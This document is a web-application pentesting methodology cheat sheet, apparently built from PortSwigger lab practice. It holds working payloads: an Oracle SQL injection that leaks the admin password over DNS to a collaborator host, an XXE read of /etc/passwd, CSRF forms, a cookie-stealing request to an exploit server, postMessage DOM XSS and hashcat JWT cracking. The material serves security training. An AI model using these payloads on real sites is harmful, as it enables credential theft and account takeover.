# Methodology

## Step 1 - Enumeration
### Directory fuzzing
Directory fuzzing list [here](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/dirsearch.txt)

### Directory fuzzing

## Step 2 - Identify sensitive features
### Password
- Password reset
- Password change

### User data
- Email change

## Step 3 - Identify vulnrabilities
### SQL injections
#### DNS exfiltration
Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % bjgsg SYSTEM "http://'||(select password from users where username='administrator')||'.8clatdya2m9x02ta9zxozvbmyd44svgk.oastify.com/">%bjgsg;]>'),'/l') from dual)||'`

### NoSQL injections
### Authentication
### Path traversal
### Command injection
### Business logic vulnerabilities
### Information disclosure
### Access control
### Command injection
### File upload
_Burp suite extension : Upload Scanner_
#### First scan
Run a first scan with all modules in order to check which are the different server responses. Based on those responses, we must determine :
- Which magic numbers are filtered
- Which file extensions are filtered
Then modules must be unselectioned in order to focus on unfiltered requests.

#### Second scan
Run a second scan that by configuring :
- Exclusion of previously identified filtered requests
- _ReDownloader parser options_ to make the extension fetch the file after it is uploaded. It will allow the extension to report any successful injection to the dashboard.

#### Manual scan
Try to test the following :
- Path traversal with file name, in order to try to execute the file from another directory
- SSRF with filename

### Race conditions
### Server-side request forge (SSRF)
### Path traversal
#### LFI fuzzing
For fuzzing lists, use:
- Burp Pro default
- [Jhaddix fuzzing list](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)
```
GET /image?filename=<INTRUDER_INPUT>
Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
```

### XXE Injection
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### Cross-site scripting (XSS)
### Cross-site request forge (CSRF)
#### CSRF using Javascript fetch()
```
<html>
    <img src="https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/?search=aaa%3b%20SameSite=None%3b%20Secure%3b%20Partitioned%3b%0d%0aSet-Cookie:%20csrf=toto%3b%20SameSite=None%3b%20Secure%3bPartitioned%3b">
    <script>
        fetch("https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/my-account/change-email", {
            method: "POST",
            credentials: "include",
            mode: "no-cors",
            headers: {
              "Content-Type": "application/json",
              // 'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'csrf=toto&email=tttt3@tttt.com'
            // body: JSON.stringify({'field':'value'})
        });
  </script>
</html>
```

#### CSRF using Javascript XMLHTTPRequest()
```
// GET request
const req = new XMLHttpRequest();
req.open("GET", "http://www.example.org/example.txt");
req.send();

// POST request
formData="a=test&b=value";
xhr.open("POST", "/article/xmlhttprequest/post/user");
xhr.send(formData);

// Steal cookie
xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit-0a0300fb04fc12638190ba2101d8001a.exploit-server.net/data?" + document.cookie);
xhr.send();
```
#### CSRF using Javascript HTML
```
<html>
  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</html>
```
### Cross-origin resource sharing (CORS)
### Clickjacking
### DOM-based vulnerabilities
#### Web messages
```
<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}','*')">
```
### WebSockets
### Insecure deserialization
#### Java
##### Install JDK 8
1. Download from [Oracle website](https://www.oracle.com/fr/java/technologies/javase/javase8-archive-downloads.html)
2. Install Burp extension Java Deserialization Scanner
3. Extension - Configure Java path to `C:\Program Files\Java\jdk1.8.0_202\java.exe`
4. Extension - Configure Ysoserial path to `C:\Users\cleme\Documents\01 - Bugbounty\TRAINING\YSOSERIAL\ysoserial-all.jar`

##### Exploit
###### OOBs exploits
Leverage [Python wrapper](https://github.com/Molx32/websec/blob/main/deserialization/ysoserial.py) to get all payloads in a file, then use Intruder and wait for collaborator to retrieve DNS calls.

#### Others
### GraphQL API vulnerabilities
### Server-side template injection
### Web cache poisoning
### HTTP Host header attacks
#### Automated scan
1. Run Param Miner extension with all scans
2. Run `can selected insertion point` on the host header
#### Check reflection in response headers

### HTTP request smuggling
### OAuth authentication
### JWT attacks
#### Brute force key
Word list [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
### Prototype pollution



## Various
### Work with hash
#### Identify hash
Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
#### Crack hash
Online tool - [Crack station](https://crackstation.net)
#### Calculate hash
Online tool - [CyberChef](https://gchq.github.io/CyberChef)

#### Brute force hash
